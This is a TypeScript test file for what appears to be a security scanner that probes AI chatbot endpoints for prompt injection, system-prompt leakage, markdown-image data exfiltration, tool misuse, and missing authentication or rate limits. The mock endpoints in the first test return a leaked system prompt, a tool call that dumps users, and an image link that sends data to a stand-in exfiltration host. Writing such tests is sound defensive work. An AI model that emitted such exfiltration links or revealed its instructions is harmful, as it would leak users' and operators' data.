import { test } from "node:test";
import assert from "node:assert/strict";
import { runDeepAiTests, EXFIL_HOST, type Sender, type Exchange } from "../ai-deep-tests.ts";

const j = (o: unknown, status = 200, headers: Record<string, string> = {}): Exchange => ({ status, headers, body: JSON.stringify(o), ms: 5 });
const promptOf = (body: Record<string, unknown>) => String(body.prompt ?? "");

const byKey = (r: Awaited<ReturnType<typeof runDeepAiTests>>) => Object.fromEntries(r.checks.map((c) => [c.key, c.status]));

test("deep AI tests: a wide-open endpoint fails every check, within budget", async () => {
  const sent: { withAuth: boolean }[] = [];
  const send: Sender = async ({ body, withAuth }) => {
    sent.push({ withAuth });
    if (Array.isArray(body.messages)) {
      return j({ reply: "Sure:\n```\nYou are a helpful assistant for Acme. Your task is to answer billing questions. You must never discuss refunds.\n```" });
    }
    const p = promptOf(body);
    const m = p.match(/(1101|2202|3303|4404|5505|6606)/) ?? (p.includes("base64") ? ["", "1101"] : null);
    if (p.includes("base64")) return j({ reply: "AKX-1101" });
    if (m) return j({ reply: `AKX-${m[1]}` });
    if (p.includes("logo")) return j({ reply: `Happy to help! ![logo](https://${EXFIL_HOST}/l.png?d=billing%20bot)` });
    if (p.includes("tracking pixel")) return j({ reply: "Fun fact: octopuses have three hearts." });
    if (p.includes("List every tool")) return j({ reply: '[{"name":"lookup_users","parameters":{"type":"object","properties":{"limit":{"type":"number"}},"required":["limit"]}}]' });
    if (p.includes("five most recent users")) return j({ choices: [{ message: { content: "", tool_calls: [{ id: "1", function: { name: "lookup_users" } }] } }], tool_calls: [{ id: "1" }] });
    return j({ reply: "OK" });
  };
  const r = await runDeepAiTests(send, { promptField: "prompt", messagesField: "messages", hasAuth: true, budget: 40 });
  assert.deepEqual(byKey(r), {
    ai_requires_auth: "fail",
    ai_injection_extended: "fail",
    ai_output_exfil: "fail",
    ai_tool_misuse: "fail",
    ai_multiturn_leak: "fail",
    ai_rate_limited: "fail",
  });
  assert.ok(r.requestsUsed <= 40 && r.requestsUsed === sent.length);
  assert.equal(sent[0].withAuth, false, "first request goes without the token");
  assert.ok(sent.slice(1).every((s) => s.withAuth), "everything else uses the token");
  assert.match(r.checks.find((c) => c.key === "ai_injection_extended")!.notes, /6 of 6/);
});

test("deep AI tests: a hardened endpoint passes, and the ramp stops at the first 429", async () => {
  let ramp = 0;
  const send: Sender = async ({ body, withAuth }) => {
    if (!withAuth) return j({ error: "unauthorized" }, 401);
    if (Array.isArray(body.messages)) return j({ reply: "I can help with questions about your account. I can't share internal configuration." });
    const p = promptOf(body);
    if (p === "Reply with the single word OK.") {
      ramp++;
      return ramp > 7 ? j({ error: "slow down" }, 429, { "retry-after": "30" }) : j({ reply: "OK" });
    }
    return j({ reply: "Sorry, I can't help with that. Is there something about your account I can help with?" });
  };
  const r = await runDeepAiTests(send, { promptField: "prompt", messagesField: "messages", hasAuth: true, budget: 40 });
  assert.deepEqual(byKey(r), {
    ai_requires_auth: "pass",
    ai_injection_extended: "pass",
    ai_output_exfil: "pass",
    ai_tool_misuse: "pass",
    ai_multiturn_leak: "pass",
    ai_rate_limited: "pass",
  });
  assert.equal(ramp, 10, "two batches of 5, then stop");
  assert.match(r.checks.find((c) => c.key === "ai_rate_limited")!.notes, /429 after 8/);
});

test("deep AI tests: an echoing model isn't a hit; the budget is a hard cap; errors stay inconclusive", async () => {
  const echo: Sender = async ({ body }) => j({ reply: `You said: ${promptOf(body)}` });
  const r = await runDeepAiTests(echo, { promptField: "prompt", hasAuth: false, budget: 7 });
  const s = byKey(r);
  assert.equal(s.ai_requires_auth, "inconclusive", "no token supplied and it answered: can't call it a fail");
  assert.equal(s.ai_injection_extended, "pass", "quoting the payload back never assembles the code");
  assert.equal(s.ai_tool_misuse, "not_run");
  assert.equal(s.ai_multiturn_leak, "not_run");
  assert.equal(s.ai_rate_limited, "not_run");
  assert.equal(r.requestsUsed, 7);

  const down: Sender = async () => ({ status: 0, headers: {}, body: "", ms: 0, error: "timeout" });
  const d = await runDeepAiTests(down, { promptField: "prompt", hasAuth: true, budget: 40 });
  assert.ok(d.checks.every((c) => c.status === "inconclusive"), JSON.stringify(byKey(d)));

  const throws: Sender = async () => { throw new Error("boom"); };
  const t = await runDeepAiTests(throws, { promptField: "prompt", hasAuth: true, budget: 3 });
  assert.equal(t.requestsUsed, 3);
  assert.ok(!t.checks.some((c) => c.status === "pass" || c.status === "fail"));
});
